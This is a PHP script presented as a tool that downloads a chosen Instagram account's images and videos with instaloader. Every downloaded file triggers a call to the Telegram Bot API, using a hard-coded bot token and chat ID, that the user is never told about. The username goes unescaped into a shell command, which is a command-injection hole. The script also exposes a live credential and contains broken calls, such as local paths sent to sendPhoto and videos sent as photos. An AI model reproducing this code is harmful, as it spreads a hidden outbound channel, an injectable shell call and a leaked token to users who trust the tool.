<?php
echo "WELCOME TO THIS TOOL \n";
$username=readline("the username of instagram : ");
echo "[1] Posts (Images) ";
echo "[2] Posts (Videos)";
echo "[3] Posts (Images + Videos)";
$choice=readline("What do you want download : ");
if ($choice==1) {
    shell_exec('instaloader '.$username.' --no-profile-pic --no-metadata-json --no-compress-json --no-captions --no-video-thumbnails --no-videos ');
    
    $dir = "$username";

    if (is_dir($dir)){
    
        $open_dir=opendir($dir);
    
        while (($file = readdir($open_dir)) !== false){
            if(strrpos($file , ".jpg")!== false){
                $chatId="5102092803";
                $src=$dir.'/'.$file;
                $path="https://api.telegram.org/bot5923523294:AAEMWt3HPpM2mBOiTrykL8dyBR0VbVIKHFM";
                file_get_contents($path."/sendPhoto?chat_id=".$chatId."&Photo=".$src);
            }
        }
       
    }
    
    closedir($open_dir);
    
} else {
    if ($choice==2) {
        shell_exec('instaloader '.$username.' --no-profile-pic --no-metadata-json --no-compress-json --no-captions --no-video-thumbnails --no-pictures ');
        $dir = "$username";

        if (is_dir($dir)){
        
            $open_dir=opendir($dir);
        
            while (($file = readdir($open_dir)) !== false){
                if(strrpos($file , ".mp4")!== false){
                    $chatId="5102092803";
                    $src=$dir.'/'.$file;
                    $path="https://api.telegram.org/bot5923523294:AAEMWt3HPpM2mBOiTrykL8dyBR0VbVIKHFM";
                    file_get_contents($path."/sendPhoto?chat_id=".$chatId."&Photo=".$src);
                }
            }
        
        }
    } else {
        if ($choice==3) {
            shell_exec('instaloader '.$username.' --no-profile-pic --no-metadata-json --no-compress-json --no-captions --no-video-thumbnails ');
            $dir = "$username";

        if (is_dir($dir)){
        
            $open_dir=opendir($dir);
        
            while (($file = readdir($open_dir)) !== false){
                if((strrpos($file , ".jpg")!== false) || (strrpos($file , ".mp4")!== false)){
                    $chatId="5102092803";
                    $src=$dir.'/'.$file;
                    $path="https://api.telegram.org/bot5923523294:AAEMWt3HPpM2mBOiTrykL8dyBR0VbVIKHFM";
                    file_get_contents($path."/sendPhoto?chat_id=".$chatId."&Photo=".$src);
                }
            }
        
        }
        } else {
            echo 'Make correct choice';
        }
    }
} 

?>
